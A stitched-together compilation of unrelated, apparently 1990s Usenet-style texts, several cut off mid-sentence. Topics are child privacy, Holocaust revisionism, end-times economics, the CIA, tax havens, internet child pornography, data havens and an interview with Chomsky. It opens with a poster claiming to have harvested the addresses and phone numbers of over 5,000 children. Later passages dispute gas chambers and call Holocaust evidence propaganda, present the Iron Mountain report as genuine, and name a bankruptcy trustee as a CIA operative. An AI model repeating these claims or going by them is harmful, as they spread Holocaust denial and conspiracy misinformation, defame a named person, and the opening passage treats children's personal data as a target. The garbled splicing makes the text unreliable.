Once you have the system tuned, all you merely have to do to locate a
street address and phone number for any number of children is just
login and poke around a bit.  Everything else is done in the
background.  You don't even have to think about it.
I've obtained the address and phone numbers of over 5,000 children so
far, but I expect this will become easier after all the kinks in the
system are worked out.

Was Dresden also right? (more died than at Hiroshima)  The firebombing
of Tokyo? (10% died in one raid).  Stalins execution of his own people?
Look at facts, not propoganda, before coming to such conclusions.
The conventions of war (namely the aim of keeping civilians out of it,
along with good treatment of prisoners) evolved over many centuries,
but then come the Brits and the Yanks to destroy it all with their
indiscriminate bombing of civilians, using the "they can stop the
torture simply by surrendering," and "those bombs saved countless
[American/British] lives!" excuses, and directing attention away from
their own attrocities by spreading propoganda such as soap made from
Jews.  Then to direct attention away from themselves even further, the
victors judge the defeated at Nuremburg for "war crimes," when the
accusors themselves were guilty of terror bombing, the worst war crime
of them all.
Does anybody really claim it did not happen?  I doubt it.
I assert that those who express doubt over details of the current
story (such as the numbers that died in the camps, the existence of
gas chambers, or whether Hitler gave an order to systematically kill
Jews) are referred to by the media as saying that the Holocaust didn't
happen, but that is *not* what they are saying.  With regard to your
grandfather being liar, that is hard to say without knowing precisly
he has said, but if he states that, eg, Dachau was a terrible place,
riddled with disease and starvation and terrible conditions, and
hundreds of thousands of people died, then who would disagree with him?
If on the other hand he asserts that he saw gassed Jews at Dachau,
then he is mistaken (although not necessarally a liar.)
The Nuremberg Trials...had been popular throughout the world and
particularly in the United States.  Equally popular was the sentence
already announced by the high tribunal: death.  But what kind of trial was
this?  ...The Constitution was not a collection of loosely given political
promises subject to broad interpretation.  It was not a list of pleasing
platitudes to be set lightly aside when expediency required it.  It was
the foundation of the American system of law and justice and [Robert Taft]
was repelled by the picture of his country discarding those Constitutional
precepts in order to punish a vanquished enemy.

The Cashless Society
The October 31 issue of Information Week featured an article on the
October 13 acquisition of Intuit Inc. by Microsoft Corporation for 1.5
billion dollars. Their vision is to create a world where all financial
transaction are performed electronically. "Microsoft's vision of the
future is clearly a world in which the majority of consumer and
business transactions will take place online". Other companies are also
rushing to enter the electronic transaction market place. Soon, there
will simply be no need for cash, everything will be done on line.
Automatic debits and credits from your bank and credit accounts will be
performed in a few milliseconds. You will be able to purchase nearly
anything in the world from your home via the electronic transaction.
(Since the original writing of this article, Microsoft did not receive
approval to make this merger with Intuit. However, the vision of
Microsoft stays the same).
America is already now seeing a widespread use of the "intelligent"
smart cards. These cards are being used for telecommunications, medical
information purchases, identification, and more. Western Union now
offers a smartcard that you can purchase to make long distance
telephone calls. The military has been issuing smartcards for some time
now to all of it's personnel. California is issuing smartcards to all
recipients of state benefits, including Social Security and welfare
benefits. The federal government is considering plans to implement a
smartcard for it's 3.1 million members for payroll purposes.
This proliferation of smartcards has not been without it's perceived
benefits. However, this new technology has created another problem,
namely security. The security offered by the smartcard is not
sufficient. Fraud, theft and abuse of smartcard technology has prompted
for many officials to call for a more secure and personal means of
transactions. A single card, useable anywhere in the world is being
considered. But even this presents problems with the issue of security
and privacy.
An improvement on smartcard technology is now being formulated. For
several years, microchips have been tested in animals to learn their
effects, efficiencies and drawbacks. This technology is now perfected
for use in humans. Instead of carrying several different types of
smartcards, credit cards and identification, we are soon to be offered
a single implanted chip that can contain information about us that
anybody ever needs to know.
Not until the last few years, has technology advance to the point where
implantation of a microchip was possible within human flesh. This is a
fulfillment of prophecy, for the Bible says "And he causeth all, both
small and great, rich and poor, free and bond, to receive a mark in
their right hand, or in their forehead" (Rev. 13:16).
Only very recently has technology made it possible to make such a mark
in human flesh. With the widespread usage of computers and databases,
tracking individuals and every financial transaction has now become a
These tiny chips are already being produced by the millions and
millions today for a variety of electronic devices, including
smartcards. We are on the verge of having these chips implanted in
every human being. Are you prepared to take your mark?
The Coming Collapse
Another deceptive lie being propagated by the government and the media
is our economy. The rate of unemployed workers in this country is being
reported to us at only 3%. However, many private sources of information
have this number much higher, closer to 9-10%. Some goes so far as to
say unemployement is really 20%! Our government cannot afford the bad
publicity of a recession. Statistics prove that nearly every major
corporation has been downsizing staff by the thousands and thousands.
Nearly 1 million positions have been abolished since the first of the
year. Yet in the face of all this, our government continues to tell us
that our economy is booming.
Our federal deficit is also much higher then is being commonly
reported. Deficit spending under President Clinton is at an all time
Simply put, our nation cannot afford to continue on it's present course
of overspending. In a report presented to President Reagan, a
commission of 31 Congressmen stated that the United States would
experience a financial collapse by the year 2012. Some forecasted that
this coming collapse would happen by the year 2005.
Consumer debt in America is the highest consumer debt in the history of
the world, bar none. Many Americans live off of credit cards, always
getting deeper and deeper into debt. The media portrays a fictitious
world where we can "afford" anything. And if we don't want to "buy,
buy, buy", then we are somehow dysfunctional or inadequate.
The average American family has to work two jobs just to make ends
meet. While our purchasing power continues to decline for every dollar
we earn, there's always something new to buy. We are beset by self
centeredness, self grandizement and narcissistic "needs". In a never
ending downward spiral, we chase the holy grail of material wealth,
urged on by the prophets of the press.
Financial ruin, broken families, despair, hopelessness and stress
related disease are often the end results. Thousands turn to alternate
realities, including drugs, alcohol, adulterous relationships and other
means of "release" from these financial pressures.
America has been teetering on the brink of a financial disaster,
unparalleled in human history. Efforts to avoid this collapse include
the establishment of a new monetary system, including the issuing of
new money. Currently, entire caravans of this newly minted money are
being distributed around the country. A national and international
recall of $100 dollar bills was proposed by Senators Patrick Leahy and
John Kerry. This recall may quite possibly trigger the greatest
financial collapse the world has ever seen. This financial collapse
could be triggered overnight when mass panic, fear and distrust in the
new monetary system becomes widespread.

Some years ago the federal government set up a special [inaudible] group. For two-and-a-half years they met in secret at Iron Mountain, New York. Their findings were called "Report from Iron Mountain on the Possibility and Desirability of Peace." Their document, by some of the leading thinkers, was suppressed. Later, it was printed in a limited edition, with the *names* removed. Some were shocked by what they read.
Throughout history, permanent peace was dangerous to established governments. War, and the threat of war, are the principal organizing force for most societies. They divert attention from *other* economic and political problems. War keeps the factories going, wasting government manpower and material that would otherwise be of surplus. Peace brings unemployment, the collapse of prices of goods and property, and knocks down the government. In simple terms, war prevents [economic] depression. (By the way, sooner or later, whatever nation loses a war is overthrown. So it has been all the centuries. The American ruling circles lost the Vietnam War. The aftermath is bound to scatter the rulers to the As the report says, in Europe, over the years, the typical standing army consisted of troops unfit for employment in commerce, industry or agriculture, led by officers unfit to practice any legitimate profession or to conduct a business enterprise. A large standing army is a form of social welfare program; a form of control of the population. War, and the threat of war, keep all levels of society busy. The newspapers are kept rich reporting it. Pundits are employed to mouth off. Wars speed up so-called scientific development. War goods do not have to show a profit or be the lowest price. In permanent peace there are vast cutbacks in research and development. And yes, wars kill off surplus population; young men with no good job waiting for The [Iron Mountain] report points out that the war system makes stable government of society possible. The end of war means the end of national sovereignty.
Without an identified enemy, why would the CIA have a large secret budget to assassinate political leaders and overthrow other governments the White House does not like?
To promote their secret agenda, the CIA has taken over a part of the savings and loan system to funnel men and money for "dirty tricks" here and overseas.
The CIA likewise manipulates the federal bankruptcy courts to grab up companies for use as covert action fronts. In Chicago, this is done with the help of foreign intelligence agencies, such as Mossad. Chicago bankruptcy trustee William A. Brand (sp?) jr. is a top honcho of the CIA and other spy shops.
In the name of national security, the mass media have been *ordered* to "soft pedal" or "stay shut" about spy agencies doing such things. The CIA involvement in bankruptcy court should have made headlines as the number one item on the evening TV news. Yet not one word is said by the liars and whores of the press.

@_subject: Corporate e-mail policy 
I used to work for a company which had a surprisingly liberal policy about e-mail.The gist of it was:
    "Private e-mail will not be read by anyone other than the recipient. The
    only exceptions to this are:
        1) Systems personnel may examine mail messages to determine if the mail
           system is working correctly; [e.g., checking mail logs against users'
           mailbox contents to verify delivery]
        2) [basically said e-mail would be treated like any other system files
           in the event of a criminal investigation, etc.]"
The policy specifically required authorization from the line VP for either of these actions, and reinforced that the systems people were to treat the e-mail as administratively confidential data.
The only time I heard of anyone even asking for e-mail was when a project manager wanted a copy of a message that a sponsor sent to one of his subordinates, who was on vacation. The systems folks cited the policy, the line VP backed them up, and the manager went away empty-handed. (He wound up calling the subordinate at her hotel and browbeating her into authorizing the computer center folks to forward a copy of the message to the manager. But that's another story.)

As of immediately, the "taxBomber's Site & Internet Offshore Center"

were, and still are, too successful for Big Brother's liking: on our
site, ordinary people (i.e. no govt. or intelligence agency personnel)
got loads of free information on *legally* saving taxes, protecting
their assets and reffectivel guarding their privacy. While we were
and still are a commercial operation, we always made a point of being
as educative and topically exhaustive as our resources would permit.
But now, it seems, little Anguilla is getting "worried about its
international reputation".
Well, they are right, though with a vengeance: the reputation they
have most certainly lost as of today is that being of one of the
world's last truly liberal tax and data havens ...

soon and will announce it here on Usenet.
Still - if anyone knows of an operational site provider *outside* US
and EU jurisdiction, please drop us a line.  Your support would be
greatly appreciated and full credits given, if you so wish.
We will probably either set up a worldwide network of fallback and
mirror sites or continue our work in a new, truly innovative way to
effectively counter any censorship and dependency on site providers.

Internet Child Porn An Issue At Stockholm Congress
STOCKHOLM - Distribution of child pornography on the Internet seems destined to top the issues at the world's first conference against sexual exploitation of
children opening later this month in Stockholm. Activists are trying to devise ways of keeping pedophiles from peddling such material on the global computer network, which is already used as a billboard to
advertise prostitution and sex tourism and to exchange adult pornography. But not everyone agrees that regulating the Internet or its 20 million users worldwide is the right move. Some advocates say the Internet represents free speech. Others argue that the distribution of child pornography on the Internet is not that widespread. Still, many see it as a problem. "The Internet is like heaven for the pedophile," said Toby Tyler, a United States police officer who lectures at the FBI Academy on child abuse. "As far as our ability to restrict the distribution of child pornography and stop the sexual exploitation of children on the Internet...it's not something that can be done."
Campaigners are concerned that unless urgent action is taken to stamp out the Internet's distribution of child porn, whether it features real children or just computer
generated images, it could spark greater demand for child pornography. "Neglecting to prohibit computer generated images could well re-establish the commercial trade -- filling bookstores with computer images, de-sensitizing society
and fueling demand for such material," said campaigner Margaret Healy from Bangkok-based End Child Prostitution in Asian Tourism (ECPAT). Tyler said the Internet has ended the days when pedophiles had to make costly cross-border runs to buy child pornography in countries where laws were laxer and
penalties lighter. Now they can obtain and distribute films and photos from their own homes on the Internet with little risk of capture. Tyler said the existence of anonymous re-mailers -- computer systems which accept material transmitted over computer lines and send it out again after coding its
original address -- concealed the source of pornography on the Internet. "Before on-line sex material was available, you'd to find someone to sell it to you, trade with you, or produce it yourself. The net provides a very high level of
safety." Short of denying people access to the network, he added, there was little to be done. Even convicted pedophiles with access to computers in prisons can get the
material. However computer experts agree the existence of just one re-mailing system in a country with more lax laws is enough for the global distribution of child
pornography on the Internet. Tyler said the most widely used re-mailing system currently operates from Finland, through which about 99 percent of all child pornography with untraceable
address codes passes. But Johan Helsingius, who runs a re-mailing system from Helsinki, said he did not think child pornography was a problem on the Internet or that any of the 10,000
messages which pass through his server daily contained child pornography. "To a large extent the net is self-regulating. As soon as you do something that offends enough people, measures will be taken by those who are involved with the
net," he said. ECPAT's Healy said in a report prepared for the five-day Stockholm conference that opens on August 27 that the regulation of child pornography on computers
presents special challenges and called on governments to fund better training. "The establishment of an international research organization with...specialists in the areas of investigation, law enforcement, behavioral science, prosecution, law and
computer technology could be an invaluable resource for the global community," Healy said. Copyright, Reuters Ltd. All rights reserved

If we are to assume that an attack on a data haven will involve the resources of large, unfriendly governments, along with the full legal (and extra-legal) powers of said governments...then it becomes possible to imagine a scenario where one's "network technique" is _studied_ in order to find possible caches for servers in the data-haven network.

To make matters worse, once a node is found, it may leak information about the rest of the network (traffic analysis, anyone?). keeping a network map where it might be found in case of a search. Don't laugh. A good deal of design will need to go into a data haven; if the documents are not destroyed or secured in some way, they could bring down the whole system.
_different_ points for an adversary to bribe/steal/warrant his way onto a point in one's haven_net. Sure, maybe he can't get _all_ of them, but what can he do with the nodes he does have?

I'd like to accept "in-demand" data (Quake alpha, anyone?) on a 'consignment basis', but can't figure out how to ensure the node pays the original uploader w/o blowing away anonymity. Anyone got a paper lying around which could help (beg beg beg)?

This requires certain features. Most importantly, the node's owner should not known, and should not be _able_ to know what exactly he or she is storing. I haven't looked at the new steg and crypto packages for linux, but that's about what I'm thinking of.
bother, when the whole point is to disappear it from physical space in the first place?? It simply allows Them to have a single point of attack.
of those 70 countries, you are in trouble. Even if the encryption is good, just looking at how much data is on the server, and from where, could be most unfortunate for business. There's a more serious concern in reliability, too; if one uses a data-splitting scheme, capturing enough servers has a probability of removing access to data.
That's bad for business.
thresholds would be good; losing one server wouldn't mean losing the data. It also forces Them to capture N servers instead of just one.
The system then relies upon the security of the locations of the servers. I am very skeptical of the idea that this can be acheived with a single "Universal Piracy Network" which is as popular and as prevalent as  is today. We need to make it easy, simple, profitable, and most of all, _FUN_. Getting people financially dependent on such a system wouldn't hurt, either.
I will be able to sell my disk space to the highest bidder, and know I am helping the cause of freedom and frictionless data.
A day where I can go forward and create value from "garbage" - unused cycles, unused HD space, underutilized graphics cards and coprocessors mouldering away in closets. Where people spontaneously join haven_nets because it's "cool", or "sensible", or any of the other justifications people make when they're jumping off the cliff with the other lemmings. When participation is a mouse-click away. When the NSA advises Congresscritters on how to best distribute their files, and spends most of its time figuring out cost/benefit analyses of the myriad haven_nets, and actively contributing its own latest, greatest, and "just unclassified" entry into the market for server software.
When no one will be able to imagine having a file without splitting it across half a dozen countries and half a hundred computers. Where it will be those who want un-encrypted data who are "strange" and "old fogies", because distributed data is _orthodox_, and the anonymity and e-cash is just a simple little feature, along with the rest, and hardly worth mentioning in and of itself. In short, no where. Utopia. But a nice vision to get wild-eyed and hand-waving about just the same.

Noam Chomsky on Anarchism, Marxism & Hope for the Future
Noam Chomsky is widely known for his critique of U.S foreign policy, and
for his work as a linguist. Less well known is his ongoing support for
libertarian socialist objectives. In a special interview done for Red and
Black Revolution, Chomsky gives his views on anarchism and marxism, and the
prospects for socialism now. The interview was conducted in May 1995 by
Kevin Doyle.
RBR: First off, Noam, for quite a time now you've been an advocate for the
anarchist idea. Many people are familiar with the introduction you wrote in
1970 to Daniel Guerin's Anarchism, but more recently, for instance in the
film Manufacturing Consent, you took the opportunity to highlight again the
potential of anarchism and the anarchist idea. What is it that attracts you
to anarchism?
CHOMSKY: I was attracted to anarchism as a young teenager, as soon as I
began to think about the world beyond a pretty narrow range, and haven't
seen much reason to revise those early attitudes since. I think it only
makes sense to seek out and identify structures of authority, hierarchy,
and domination in every aspect of life, and to challenge them; unless a
justification for them can be given, they are illegitimate, and should be
dismantled, to increase the scope of human freedom. That includes political
power, ownership and management, relations among men and women, parents and
children, our control over the fate of future generations (the basic moral
imperative behind the environmental movement, in my view), and much else.
Naturally this means a challenge to the huge institutions of coercion and
control: the state, the unaccountable private tyrannies that control most
of the domestic and international economy, and so on. But not only these.
That is what I have always understood to be the essence of anarchism: the
conviction that the burden of proof has to be placed on authority, and that
it should be dismantled if that burden cannot be met. Sometimes the burden
can be met. If I'm taking a walk with my grandchildren and they dart out
into a busy street, I will use not only authority but also physical
coercion to stop them. The act should be challenged, but I think it can
readily meet the challenge. And there are other cases; life is a complex
affair, we understand very little about humans and society, and grand
pronouncements are generally more a source of harm than of benefit. But the
perspective is a valid one, I think, and can lead us quite a long way.
Beyond such generalities, we begin to look at cases, which is where the
questions of human interest and concern arise.
RBR: It's true to say that your ideas and critique are now more widely
known than ever before. It should also be said that your views are widely
respected. How do you think your support for anarchism is received in this
context? In particular, I'm interested in the response you receive from
people who are getting interested in politics for the first time and who
may, perhaps, have come across your views. Are such people surprised by
your support for anarchism? Are they interested?
CHOMSKY: The general intellectual culture, as you know, associates
'anarchism' with chaos, violence, bombs, disruption, and so on. So people
are often surprised when I speak positively of anarchism and identify
myself with leading traditions within it. But my impression is that among
the general public, the basic ideas seem reasonable when the clouds are
cleared away. Of course, when we turn to specific matters - say, the nature
of families, or how an economy would work in a society that is more free
and just - questions and controversy arise. But that is as it should be.
Physics can't really explain how water flows from the tap in your sink.
When we turn to vastly more complex questions of human significance,
understanding is very thin, and there is plenty of room for disagreement,
experimentation, both intellectual and real-life exploration of
possibilities, to help us learn more.
RBR: Perhaps, more than any other idea, anarchism has suffered from the
problem of misrepresentation. Anarchism can mean many things to many
people. Do you often find yourself having to explain what it is that you
mean by anarchism? Does the misrepresentation of anarchism bother you?
CHOMSKY: All misrepresentation is a nuisance. Much of it can be traced back
to structures of power that have an interest in preventing understanding,
for pretty obvious reasons. It's well to recall David Hume's Principles of
Government. He expressed surprise that people ever submitted to their
rulers. He concluded that since Force is always on the side of the
governed, the governors have nothing to support them but opinion. 'Tis
therefore, on opinion only that government is founded; and this maxim
extends to the most despotic and most military governments, as well as to
the most free and most popular. Hume was very astute - and incidentally,
hardly a libertarian by the standards of the day. He surely underestimates
the efficacy of force, but his observation seems to me basically correct,
and important, particularly in the more free societies, where the art of
controlling opinion is therefore far more refined. Misrepresentation and
other forms of befuddlement are a natural concomitant.
So does misrepresentation bother me? Sure, but so does rotten weather. It
will exist as long as concentrations of power engender a kind of commissar
class to defend them. Since they are usually not very bright, or are bright
enough to know that they'd better avoid the arena of fact and argument,
they'll turn to misrepresentation, vilification, and other devices that are
available to those who know that they'll be protected by the various means
available to the powerful. We should understand why all this occurs, and
unravel it as best we can. That's part of the project of liberation - of
ourselves and others, or more reasonably, of people working together to
achieve these aims.
Sounds simple-minded, and it is. But I have yet to find much commentary on
human life and society that is not simple-minded, when absurdity and
self-serving posturing are cleared away.
RBR: How about in more established left-wing circles, where one might
expect to find greater familiarity with what anarchism actually stands for?
Do you encounter any surprise here at your views and support for anarchism?
CHOMSKY: If I understand what you mean by established left-wing circles,
there is not too much surprise about my views on anarchism, because very
little is known about my views on anything. These are not the circles I
deal with. You'll rarely find a reference to anything I say or write.
That's not completely true of course. Thus in the US (but less commonly in
the UK or elsewhere), you'd find some familiarity with what I do in certain
of the more critical and independent sectors of what might be called
established left-wing circles, and I have personal friends and associates
scattered here and there. But have a look at the books and journals, and
you'll see what I mean. I don't expect what I write and say to be any more
welcome in these circles than in the faculty club or editorial board room -
again, with exceptions.
The question arises only marginally, so much so that it's hard to answer.
RBR: A number of people have noted that you use the term 'libertarian
socialist' in the same context as you use the word 'anarchism'. Do you see
these terms as essentially similar? Is anarchism a type of socialism to
you? The description has been used before that anarchism is equivalent to
socialism with freedom. Would you agree with this basic equation?
CHOMSKY: The introduction to Guerin's book that you mentioned opens with a
quote from an anarchist sympathiser a century ago, who says that anarchism
has a broad back, and endures anything. One major element has been what has
traditionally been called 'libertarian socialism'. I've tried to explain
there and elsewhere what I mean by that, stressing that it's hardly
original; I'm taking the ideas from leading figures in the anarchist
movement whom I quote, and who rather consistently describe themselves as
socialists, while harshly condemning the 'new class' of radical
intellectuals who seek to attain state power in the course of popular
struggle and to become the vicious Red bureaucracy of which Bakunin warned;
what's often called 'socialism'. I rather agree with Rudolf Rocker's
perception that these (quite central) tendencies in anarchism draw from the
best of Enlightenment and classical liberal thought, well beyond what he
described. In fact, as I've tried to show they contrast sharply with
Marxist-Leninist doctrine and practice, the 'libertarian' doctrines that
are fashionable in the US and UK particularly, and other contemporary
ideologies, all of which seem to me to reduce to advocacy of one or another
form of illegitimate authority, quite often real tyranny.
The Spanish Revolution
RBR: In the past, when you have spoken about anarchism, you have often
emphasised the example of the Spanish Revolution. For you there would seem
to be two aspects to this example. On the one hand, the experience of the
Spanish Revolution is, you say, a good example of 'anarchism in action'. On
the other, you have also stressed that the Spanish revolution is a good
example of what workers can achieve through their own efforts using
participatory democracy. Are these two aspects - anarchism in action and
participatory democracy - one and the same thing for you? Is anarchism a
philosophy for people's power?
CHOMSKY: I'm reluctant to use fancy polysyllables like philosophy to refer
to what seems ordinary common sense. And I'm also uncomfortable with
slogans. The achievements of Spanish workers and peasants, before the
revolution was crushed, were impressive in many ways. The term
'participatory democracy' is a more recent one, which developed in a
different context, but there surely are points of similarity. I'm sorry if
this seems evasive. It is, but that's because I don't think either the
concept of anarchism or of participatory democracy is clear enough to be
able to answer the question whether they are the same.
RBR: One of the main achievements of the Spanish Revolution was the degree
of grassroots democracy established. In terms of people, it is estimated
that over 3 million were involved. Rural and urban production was managed
by workers themselves. Is it a coincidence to your mind that anarchists,
known for their advocacy of individual freedom, succeeded in this area of
collective administration?
CHOMSKY: No coincidence at all. The tendencies in anarchism that I've
always found most persuasive seek a highly organised society, integrating
many different kinds of structures (workplace, community, and manifold
other forms of voluntary association), but controlled by participants, not
by those in a position to give orders (except, again, when authority can be
justified, as is sometimes the case, in specific contingencies).
RBR: Anarchists often expend a great deal of effort at building up
grassroots democracy. Indeed they are often accused of taking democracy to
extremes. Yet, despite this, many anarchists would not readily identify
democracy as a central component of anarchist philosophy. Anarchists often
describe their politics as being about 'socialism' or being about 'the
individual'- they are less likely to say that anarchism is about democracy.
Would you agree that democratic ideas are a central feature of anarchism?
CHOMSKY: Criticism of 'democracy' among anarchists has often been criticism
of parliamentary democracy, as it has arisen within societies with deeply
repressive features. Take the US, which has been as free as any, since its
origins. American democracy was founded on the principle, stressed by James
Madison in the Constitutional Convention in 1787, that the primary function
of government is to protect the minority of the opulent from the majority.
Thus he warned that in England, the only quasi-democratic model of the day,
if the general population were allowed a say in public affairs, they would
implement agrarian reform or other atrocities, and that the American system
must be carefully crafted to avoid such crimes against the rights of
property, which must be defended (in fact, must prevail). Parliamentary
democracy within this framework does merit sharp criticism by genuine
libertarians, and I've left out many other features that are hardly subtle
- slavery, to mention just one, or the wage slavery that was bitterly
condemned by working people who had never heard of anarchism or communism
right through the 19th century, and beyond.
RBR: The importance of grassroots democracy to any meaningful change in
society would seem to be self evident. Yet the left has been ambiguous
about this in the past. I'm speaking generally, of social democracy, but
also of Bolshevism - traditions on the left that would seem to have more in
common with elitist thinking than with strict democratic practice. Lenin,
to use a well-known example, was sceptical that workers could develop
anything more than trade union consciousness- by which, I assume, he meant
that workers could not see far beyond their immediate predicament.
Similarly, the Fabian socialist, Beatrice Webb, who was very influential in
the Labour Party in England, had the view that workers were only interested
in horse racing odds! Where does this elitism originate and what is it
doing on the left?
CHOMSKY: I'm afraid it's hard for me to answer this. If the left is
understood to include 'Bolshevism,' then I would flatly dissociate myself
from the left. Lenin was one of the greatest enemies of socialism, in my
opinion, for reasons I've discussed. The idea that workers are only
interested in horse-racing is an absurdity that cannot withstand even a
superficial look at labour history or the lively and independent working
class press that flourished in many places, including the manufacturing
towns of New England not many miles from where I'm writing - not to speak
of the inspiring record of the courageous struggles of persecuted and
oppressed people throughout history, until this very moment. Take the most
miserable corner of this hemisphere, Haiti, regarded by the European
conquerors as a paradise and the source of no small part of Europe's
wealth, now devastated, perhaps beyond recovery. In the past few years,
under conditions so miserable that few people in the rich countries can
imagine them, peasants and slum-dwellers constructed a popular democratic
movement based on grassroots organisations that surpasses just about
anything I know of elsewhere; only deeply committed commissars could fail
to collapse with ridicule when they hear the solemn pronouncements of
American intellectuals and political leaders about how the US has to teach
Haitians the lessons of democracy. Their achievements were so substantial
and frightening to the powerful that they had to be subjected to yet
another dose of vicious terror, with considerably more US support than is
publicly acknowledged, and they still have not surrendered. Are they
interested only in horse-racing?
I'd suggest some lines I've occasionally quoted from Rousseau: when I see
multitudes of entirely naked savages scorn European voluptuousness and
endure hunger, fire, the sword, and death to preserve only their
independence, I feel that it does not behoove slaves to reason about
RBR: Speaking generally again, your own work - Deterring Democracy,
Necessary Illusions, etc. - has dealt consistently with the role and
prevalence of elitist ideas in societies such as our own. You have argued
that within 'Western' (or parliamentary) democracy there is a deep
antagonism to any real role or input from the mass of people, lest it
threaten the uneven distribution in wealth which favours the rich. Your
work is quite convincing here, but, this aside, some have been shocked by
your assertions. For instance, you compare the politics of President John
F. Kennedy with Lenin, more or less equating the two. This, I might add,
has shocked supporters of both camps! Can you elaborate a little on the
validity of the comparison?
CHOMSKY: I haven't actually equated the doctrines of the liberal
intellectuals of the Kennedy administration with Leninists, but I have
noted striking points of similarity - rather as predicted by Bakunin a
century earlier in his perceptive commentary on the new class. For example,
I quoted passages from McNamara on the need to enhance managerial control
if we are to be truly free, and about how the undermanagement that is the
real threat to democracy is an assault against reason itself. Change a few
words in these passages, and we have standard Leninist doctrine. I've
argued that the roots are rather deep, in both cases. Without further
clarification about what people find shocking, I can't comment further. The
comparisons are specific, and I think both proper and properly qualified.
If not, that's an error, and I'd be interested to be enlightened about it.
RBR: Specifically, Leninism refers to a form of marxism that developed with
V.I. Lenin. Are you implicitly distinguishing the works of Marx from the
particular criticism you have of Lenin when you use the term 'Leninism'? Do
you see a continuity between Marx's views and Lenin's later practices?
CHOMSKY: Bakunin's warnings about the Red bureaucracy that would institute
the worst of all despotic governments were long before Lenin, and were
directed against the followers of Mr. Marx. There were, in fact, followers
of many different kinds; Pannekoek, Luxembourg, Mattick and others are very
far from Lenin, and their views often converge with elements of
anarcho-syndicalism. Korsch and others wrote sympathetically of the
anarchist revolution in Spain, in fact. There are continuities from Marx to
Lenin, but there are also continuities to Marxists who were harshly
critical of Lenin and Bolshevism. Teodor Shanin's work in the past years on
Marx's later attitudes towards peasant revolution is also relevant here.
I'm far from being a Marx scholar, and wouldn't venture any serious
judgement on which of these continuities reflects the 'real Marx,' if there
even can be an answer to that question.
RBR: Recently, we obtained a copy of your own Notes On Anarchism
(re-published last year by Discussion Bulletin in the USA). In this you
mention the views of the early Marx, in particular his development of the
idea of alienation under capitalism. Do you generally agree with this
division in Marx's life and work - a young, more libertarian socialist but,
in later years, a firm authoritarian?
CHOMSKY: The early Marx draws extensively from the milieu in which he
lived, and one finds many similarities to the thinking that animated
classical liberalism, aspects of the Enlightenment and French and German
Romanticism. Again, I'm not enough of a Marx scholar to pretend to an
authoritative judgement. My impression, for what it is worth, is that the
early Marx was very much a figure of the late Enlightenment, and the later
Marx was a highly authoritarian activist, and a critical analyst of
capitalism, who had little to say about socialist alternatives. But those
are impressions.
RBR: From my understanding, the core part of your overall view is informed
by your concept of human nature. In the past the idea of human nature was
seen, perhaps, as something regressive, even limiting. For instance, the
unchanging aspect of human nature is often used as an argument for why
things can't be changed fundamentally in the direction of anarchism. You
take a different view? Why?
CHOMSKY: The core part of anyone's point of view is some concept of human
nature, however it may be remote from awareness or lack articulation. At
least, that is true of people who consider themselves moral agents, not
monsters. Monsters aside, whether a person who advocates reform or
revolution, or stability or return to earlier stages, or simply cultivating
one's own garden, takes stand on the grounds that it is 'good for people.'
But that judgement is based on some conception of human nature, which a
reasonable person will try to make as clear as possible, if only so that it
can be evaluated. So in this respect I'm no different from anyone else.
You're right that human nature has been seen as something 'regressive,' but
that must be the result of profound confusion. Is my granddaughter no
different from a rock, a salamander, a chicken, a monkey? A person who
dismisses this absurdity as absurd recognises that there is a distinctive
human nature. We are left only with the question of what it is - a highly
nontrivial and fascinating question, with enormous scientific interest and
human significance. We know a fair amount about certain aspects of it - not
those of major human significance. Beyond that, we are left with our hopes
and wishes, intuitions and speculations.
There is nothing regressive about the fact that a human embryo is so
constrained that it does not grow wings, or that its visual system cannot
function in the manner of an insect, or that it lacks the homing instinct
of pigeons. The same factors that constrain the organism's development also
enable it to attain a rich, complex, and highly articulated structure,
similar in fundamental ways to conspecifics, with rich and remarkable
capacities. An organism that lacked such determinative intrinsic structure,
which of course radically limits the paths of development, would be some
kind of amoeboid creature, to be pitied (even if it could survive somehow).
The scope and limits of development are logically related.
Take language, one of the few distinctive human capacities about which much
is known. We have very strong reasons to believe that all possible human
languages are very similar; a Martian scientist observing humans might
conclude that there is just a single language, with minor variants. The
reason is that the particular aspect of human nature that underlies the
growth of language allows very restricted options. Is this limiting? Of
course. Is it liberating? Also of course. It is these very restrictions
that make it possible for a rich and intricate system of expression of
thought to develop in similar ways on the basis of very rudimentary,
scattered, and varied experience.
What about the matter of biologically-determined human differences? That
these exist is surely true, and a cause for joy, not fear or regret. Life
among clones would not be worth living, and a sane person will only rejoice
that others have abilities that they do not share. That should be
elementary. What is commonly believed about these matters is strange
indeed, in my opinion.
Is human nature, whatever it is, conducive to the development of anarchist
forms of life or a barrier to them? We do not know enough to answer, one
way or the other. These are matters for experimentation and discovery, not
empty pronouncements.
The future
RBR: To begin finishing off, I'd like to ask you briefly about some current
issues on the left. I don't know if the situation is similar in the USA but
here, with the fall of the Soviet Union, a certain demoralisation has set
in on the left. It isn't so much that people were dear supporters of what
existed in the Soviet Union, but rather it's a general feeling that with
the demise of the Soviet Union the idea of socialism has also been dragged
down. Have you come across this type of demoralisation? What's your
response to it?
CHOMSKY: My response to the end of Soviet tyranny was similar to my
reaction to the defeat of Hitler and Mussolini. In all cases, it is a
victory for the human spirit. It should have been particularly welcome to
socialists, since a great enemy of socialism had at last collapsed. Like
you, I was intrigued to see how people - including people who had
considered themselves anti-Stalinist and anti-Leninist - were demoralised
by the collapse of the tyranny. What it reveals is that they were more
deeply committed to Leninism than they believed.
There are, however, other reasons to be concerned about the elimination of
this brutal and tyrannical system, which was as much socialist as it was
democratic (recall that it claimed to be both, and that the latter claim
was ridiculed in the West, while the former was eagerly accepted, as a
weapon against socialism - one of the many examples of the service of
Western intellectuals to power). One reason has to do with the nature of
the Cold War. In my view, it was in significant measure a special case of
the 'North-South conflict,' to use the current euphemism for Europe's
conquest of much of the world. Eastern Europe had been the original 'third
world,' and the Cold War from 1917 had no slight resemblance to the
reaction of attempts by other parts of the third world to pursue an
independent course, though in this case differences of scale gave the
conflict a life of its own. For this reason, it was only reasonable to
expect the region to return pretty much to its earlier status: parts of the
West, like the Czech Republic or Western Poland, could be expected to
rejoin it, while others revert to the traditional service role, the
ex-Nomenklatura becoming the standard third world elite (with the approval
of Western state-corporate power, which generally prefers them to
alternatives). That was not a pretty prospect, and it has led to immense
Another reason for concern has to do with the matter of deterrence and
non-alignment. Grotesque as the Soviet empire was, its very existence
offered a certain space for non-alignment, and for perfectly cynical
reasons, it sometimes provided assistance to victims of Western attack.
Those options are gone, and the South is suffering the consequences.
A third reason has to do with what the business press calls the pampered
Western workers with their luxurious lifestyles. With much of Eastern
Europe returning to the fold, owners and managers have powerful new weapons
